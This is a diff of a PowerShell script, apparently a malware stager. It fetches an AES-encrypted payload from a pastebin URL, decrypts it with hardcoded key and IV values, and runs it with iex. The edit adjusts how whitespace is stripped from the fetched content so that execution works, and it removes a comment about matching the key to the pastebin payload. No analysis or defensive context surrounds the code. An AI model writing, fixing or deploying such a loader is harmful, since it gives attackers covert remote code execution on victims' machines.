@@ -13,13 +13,12 @@ function D {
     [Text.Encoding]::UTF8.GetString($m.ToArray())
 }
 
-# AES key and IV (keep these matching the payload stored in pastebin)
 $k = [Convert]::FromBase64String("MWLR/AnZl1Hcjyfe5DgD43LdgkQtVISS28mCeNuRi9Q=")
 $i = [Convert]::FromBase64String("JIEvxYrJ4H/jObIrU3Ba9g==")
 
 try {
-    $r = iwr "https://pastebin.com/raw/CHW3WPRA" -UseBasicParsing
-    $p = $r.Content.Trim()
+    $raw = iwr "https://pastebin.com/raw/CHW3WPRA" -UseBasicParsing
+    $p = $raw.Content -replace '\s',''  # <-- removes line breaks and spaces
     iex (D $p $k $i)
 } catch {
     Write-Error "[-] Failed to fetch or execute encrypted payload."
